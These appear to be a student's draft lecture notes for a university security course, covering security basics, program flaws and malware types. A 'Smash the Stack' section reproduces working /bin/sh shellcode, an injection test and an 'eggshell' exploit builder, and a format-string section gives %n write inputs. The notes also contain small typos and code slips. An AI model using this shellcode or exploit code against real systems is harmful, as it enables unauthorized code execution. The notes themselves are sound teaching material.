---
title: "CS 489 Security"
date: 2024-01-09T11:33:24-05:00
draft: true
tags: [
  'university'
]
---

<!--
[Learn uWaterloo](https://learn.uwaterloo.ca/d2l/le/content/1005130/Home)

[Course Website](https://cs.uwaterloo.ca/~m285xu/courses/cs489-w24/)
 -->

## Introduction

### Assignments

- 4 [Assignments](https://cs.uwaterloo.ca/~m285xu/courses/cs489-w24/assignments/) worth 25% each
- Written and/or programming
- Start ASAP

Assignment | Start Date | Due Date | Days Given | Grade Weight
----------------| -------------- | ------------- | --------------- | -------------------
1 | Jan 23 | Feb 09 | 17 | 25%
2 | Feb 13 | Mar 01 | 17 | 25%
3 | Mar 05 | Mar 22 | 17 | 25%
4 | Mar 26 | Apr 05 | 10 | 25%

### Textbooks

- [Computer Security and the Internet](https://link.springer.com/book/10.1007/978-3-030-83411-13th)
- [Security in Computing 5th edition](https://eopcw.com/assets/stores/Computer%20Security/lecturenote_1704978481security-in-computing-5-e.pdf)

### Goals

- Confidentiality: limiting access to authorized parties
- Integrity: when you receive data, you get the "right" data
- Availability: the system or data is there when you want it
  - Hardest to uphold since attacker has many ways to take down a system

### Security and Privacy

- When the entities are different, they may appear to be opposing, but when the entity is the same (you), then it works complimentary
  - Airport Security
  - App sandboxing and permissions
  - PIPEDA (Personal Information Protection and Electronic Documents Act) for private-sector privacy legislation
    - Forthcoming Consumer Privacy Protection Act to modernize protection: meaningful consent, right to erasure

### Adversaries

- Murphy Amateurs
  - Bugs waiting to be exploited
- Script kiddies
  - People who just copy attacks from other people
- Crackers or Hackers
  - Hacker is a general term, not necessarily related to security
  - Cracker is 100% only related to writing things for script kiddies and etc.
- Organized crime
- Government "cyberwarriors"
- Terrorists

### Terminology

- Assets
- Vulnerability
  - Weaknesses that may be able to be exploited
  - e.g. file server without authentication
  - API to access GPS coordinates without authenticating apps
- Threats
  - A loss or harm
  - Interception
  - Interruption
  - Modification
  - Fabrication
- Attack
  - An action which exploits a vulnerability to execute a threat
- Control/Defence
  - Removing or reducing a vulnerability
  - Prevent an attack and defend against a threat

### Methods of Defence

- PRevent it
- Deter it
- Deflect it: make yourself less attractive to attacker (Xbox)
- Detect it
- Recover from ti
- Defence in depth
- Your car may get stolen
  - Park inside your garage
  - Lock your car
  - Insurance

### Weakest Link

- A system is only as strong as its weakest link

### Defence of Computer Systems

- Cryptography
  - Digital signatures
  - Cryptographic protocols
  - Unreadable to an attacker
- Software Controls
  - Passwords
  - Separate user actions from each other
  - Virus scanner
  - Development controls
  - Firewalls
- Hardware Controls
  - Fingerprint
  - Smart tokens
  - Trusted Execution Environments (TEEs)
- Physical Controls
  - Locks
  - Guards
  - Off-site backups
- Policies and Procedures
  - Non-technical means can be used to protect against some classes of attack
  - Rules about choosing passwords
  - Training in best security practices
  - VPN

## Program Security

### Flaw, faults, and failures

- Flaw is a problem with a program
- Security flaw is a flaw that affects security in some way (confidentiality, integrity, availability)
- Flaws are faults or failures
  - A fault is a potential problem and behind the scenes
  - Once exploited, it becomes a failure

### Finding and Fixing Faults

- Fuzzing:
  - Test with random input
- Think like an attacker
- Can work backwards if user reported a failure
- Make patches to the program
- Penetrate and patch
- MIcrosoft's "Patch Tuesday"
- Zero day: problem not known to the vendor

Problems with patching

- HIgh pressure to fix the fault results in narrow focus instead of broad underlying problem
- Fault caused other, unnoticed failures, and a partial fix
- Patch causes new faults, here or elsewhere

Alternatives?

- Test based updating
  - Create a test for the security vulnerability and then fix code so that tests pass

### Unexpected Behaviour

- Program has a spec for what the program must do
- From security POV, extra behaviours could be bad
- Always consider "and nothing else"
- How to test Should do vs. Should not do

### Types of security flaws

- Genesis method
  - Intentional
    - Malicious
    - Non-malicious
      - A backdoor or a bad security that was supposed to be removed
  - Unintentional

Most security flaws are unintentional program errors

### Unintentional Security Flaws

- Heartbleed Bug in OpenSSL (April 2014)
- TLS Heartbeat mechanism was designed to keep SSL/TLS connections alive even when no data is being transmitted
- Random data and a payload length
- Other peer supposed to respond with a mirror of exactly the same data
- Missing bounds check in the code
- Attacker can request 64KB of memory space from the same area that holds server's private key

![Comic](https://imgs.xkcd.com/comics/heartbleed_explanation_2x.png)

Types:

- Buffer overflows
- Integer overflows
- Incomplete mediation
- Format string vulnerabilities
- TOCTTOU errors (Time-of-check to time-of-use)

### Buffer Overflows

- Most commonly exploited type of security flaw
- Program code (Text)
- Global data (BSS and data segments)
- Heap (dynamically allocated data)
- Function call data (Stack)
  - The stack increases (lower memory addresses) as functions are called (frames)
  - x86 architecture
- Important addresses: Return Address and Frame Pointer
- Example

```c
#defined LINELEN 1024
char buffer[LINELEN];

gets(buffer);
// OR
strcpy(buffer, arv[1]);
```

What happens when the buffer length < than the first argument?


```c
int check_signature(char *str, int j) {
  int i = 0;
  char user_signature[24];
  strcpy(user_signature, str);
  if(isValid(user_signature));
    i = 1;
  return i;
}
```

```c
// main FRAME
...
// check_signature FRAME
j
&str                                                          FP + 8
Return Address (RA)
Old Frame Pointer (FP)                           <----- FRAME POINTER HERE
............
Padding
............
Value of i
user_signature[23]
...
user_signature[0]
```

When a function call returns, the OLD FP and local variables of its stack are popped but the args and RA are kept since it's part of its parent's local variables.

Str = "randomStringLongerThan24Bytes"

We can use `\xbf...` to overwrite the return addresses such that the function and program returns to another part. We can also set that `i = 1` through.

- Crash reasons
  - overwritten RA to an invalid address
  - unmapped virtual address
  - valid address does not point to an instruction
    - Question: by is not an instruction, is that a raw data does not correspond to an instruction, or is it in the wrong part of the code?
  - address content is off-limit

<details><summary>Smash the Stack</summary>

How did we know to add 8 to the return address?  We used a
test value first (for example 1), compiled the program, and then started gdb:

```gdb
gdb example3
(gdb) disassemble main
```

0x8004b2 - 0x8004a8 = 8

- We want to spawn a shell and run arbitrary command
- We want to overwrite the buffer with code we want to run
- We want to set the return address to the address of the code we want to run
- Write code in hack.c, compile, and use gdb to get the code commands
- (gdb) disassemble main
- (gdb) disassemble __execve

Template

```c
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
```

1. Have the null terminated string "/bin/sh" somewhere in memory.
2. Have the address of the string "/bin/sh" somewhere in memory followed by a null long word.
3. Copy 0xb into the EAX register.
4. Copy the address of the address of the string "/bin/sh" into the EBX register.
5. Copy the address of the string "/bin/sh" into the ECX register.
6. Copy the address of the null long word into the EDX register.
7. Execute the int $0x80 instruction.
8. Copy 0x1 into the EAX register.
9. Copy 0x0 into the EBX register.
10. Execute the int $0x80 instruction.

We also want to add an exit(0) call to make sure things are fine

```c
#include <stdlib.h>

void main() {
        exit(0);
}
```

want to make sure to not have null bytes.

```c
char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;

  for (i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}
```

```gdb
(gdb) disassemble main
...End of assembler dump.
(gdb) x/bx main+3
0x8000133 <main+3>:     0xeb
```

Test your exploit. We also need to replace null bytes.

```c
char shellcode[] =
	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

void main() {
   int *ret;

   ret = (int *)&ret + 2;
   (*ret) = (int)shellcode;

}
```

```txt
Problem instruction:                 Substitute with:
--------------------------------------------------------
movb   $0x0,0x7(%esi)                xorl   %eax,%eax
molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
                                    movl   %eax,0xc(%esi)
--------------------------------------------------------
movl   $0xb,%eax                     movb   $0xb,%al
--------------------------------------------------------
movl   $0x1, %eax                    xorl   %ebx,%ebx
movl   $0x0, %ebx                    movl   %ebx,%eax
                                    inc    %eax
```

How to print the stack pointer

```c
unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}
void main() {
  printf("0x%x\n", get_sp());
}
```

Since we don't know where our code starts, we want to use a bunch of NOP (0x90), then put our code, then put the return addresses.

We can also use Environment variables, in case the buffer is small.

What to look for?

> They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string.  gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF.  It performs no checks for buffer overflows.  The scanf() family of functions can also be a problem if you are matching a sequence of non-white-space characters (%s), or matching a non-empty sequence of characters from a specified set (%[]), and the array pointed to by the char pointer, is not large enough to accept the whole sequence of characters, and you have not defined the optional maximum field width.  If the target of any of these functions is a buffer of static size, and its other argument was somehow derived from user input there is a good posibility that you might be able to exploit a buffer overflow.

> Another usual programming construct we find is the use of a while loop to read one character at a time into a buffer from stdin or some file until the end of line, end of file, or some other delimiter is reached.  This type of construct usually uses one of these functions: getc(), fgetc(), or getchar(). If there is no explicit checks for overflows in the while loop, such programs are easily exploited.

```c
// shellcode.c
#if defined(__i386__) && defined(__linux__)

#define NOP_SIZE	1
char nop[] = "\x90";
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)

#define NOP_SIZE	4
char nop[]="\xac\x15\xa1\x6e";
char shellcode[] =
  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
  "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";

unsigned long get_sp(void) {
  __asm__("or %sp, %sp, %i0");
}

#elif defined(__sparc__) && defined(__sun__)

#define NOP_SIZE        4
char nop[]="\xac\x15\xa1\x6e";
char shellcode[] =
  "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
  "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
  "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
  "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";

unsigned long get_sp(void) {
  __asm__("or %sp, %sp, %i0");
}

#endif
```

```c
// eggshell.c
#include <stdlib.h>
#include <stdio.h>
#include "shellcode.h"

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048

void usage(void);

void main(int argc, char *argv[]) {
  char *ptr, *bof, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;

  while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
    switch (c) {
      case 'a':
        align = atoi(optarg);
        break;
      case 'b':
        bsize = atoi(optarg);
        break;
      case 'e':
        eggsize = atoi(optarg);
        break;
      case 'o':
        offset = atoi(optarg);
        break;
      case '?':
        usage();
        exit(0);
    }

  if (strlen(shellcode) > eggsize) {
    printf("Shellcode is larger the the egg.\n");
    exit(0);
  }

  if (!(bof = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
    bsize, eggsize, align);
  printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);

  addr_ptr = (long *) bof;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
    for (n = 0; n < NOP_SIZE; n++) {
      m = (n + align) % NOP_SIZE;
      *(ptr++) = nop[m];
    }

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  bof[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);
  putenv(egg);

  memcpy(bof,"BOF=",4);
  putenv(bof);
  system("/bin/sh");
}

void usage(void) {
  (void)fprintf(stderr,
    "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\n");
}
```

In the end

```txt
SHELL CODE
NOP
FILLED RAS
```

</details>

### Single Bytes Buffer Overflow

- Programmers forget to allocate null terminator so a single byte can be written past the end of the buffer
- Heap Overflow

### Causes

- Missing boundary check
- Ability to overwrite important memory regions
- Data is treated as code and executed
- Predictability of the addresses

### Defences

- Use a language with bounds checking
- Canaries (padding between data and return address)
- Check if stack has been overwritten before the return from each function
- OS
- Hardware

### Cross-Site Scripting (XSS) Attacks

- Use browser interprets the data as code
- Client-side mediation
  - Invalid data
  - Client is arbitrary, so need to enforce validation on server

### Format String Vulnerabilities

- printf(buffer) instead of printf("%s", buffer)
- provide input:`%d...%s`
- Suppose we want to read a variable `pin` and the address through debugging is said to be `0x0804fa88`
- Provide input `0x0804fa888%d...%s`
- Provide input `0x0804fa888%d...%n` <- %n can change the value

### TOCTTOU

- time-of-check to time-of-use
- gap between time of check and the time of use
- unix terminal was running with SU to allocate terminals to users (which was a privilege operation)
- Supported command to write to log file
- First checks if the user has the permissions to write to the requested file, and opens the file for writing
- The attacker would first make a symbolic link to a file they she owned, and then changes it to another file
- The attacker would most likely run the exploit in a loop
- Defences:
  - Atomic operation
  - Use file handles not file names since file handles cannot be changed

### Malicious code: Malware

- Malicious software
  - User action
    - Channels
      - USBs are automatically executed
      - Downloading and running
      - Executable email attachment
      - Inserting CD/DVD or USB flash drive
  - Exploiting an existing fault in a system
    - Whatsapp buffer overflows is SMS daemon
  - Virus
    - Adds itself to benign programs/files
    - Code for spreading + code for actual attack
    - Usually activated by users
  - Worms
    - Spreading with no or little user involvement
  - Trojans
    - HIdden in seemingly innocent program
  - Logic bombs
    - Hidden in programs already on your machine
  - Infection
- Infection
  - Infect the computer itself
  - Modifying the boot loader
  - Executable: modifying other programs and add to the beginning
  - Macros: edit other documents to add itself as a macro which starts automatically
- Payload
  - The bad thing
    - Erase hard drive
    - Corrupt some of your spreadsheets
    - Keylogger
    - Attacks a website
- Signature-based protection
  - Keep a list of all known viruses
  - Infection code and payload code
  - viruses try obfuscation
- Polymorphism
  - When code is shared, the virus is encrypted, and then decrypted
  - Encrypt with different keys for different machines
- Behaviour-based protection
  - Run in a sandbox first
  - Look for suspicious patterns not specific code fragments
- False negative vs. False positive
  - False negative is worse
- Code Red Worm
  - 2001, IIS exploit, patch available for more than one month
- Stuxnet
  - Discovered in 2010, targets Siemens SCADA systems installed on Windows. Gas centrifuges.
  - Four zero-day vulnerabilities
  - Very targeted
- IoT Malware
  - Limited in terms of resources
- Trojan Horses
  - Programs which claim to do something innocuous but hide malicious behaviour
- Scareware
- Ransomware
- Web bug
  - Intuit violation of privacy
- Back doors
  - Debugging left overs
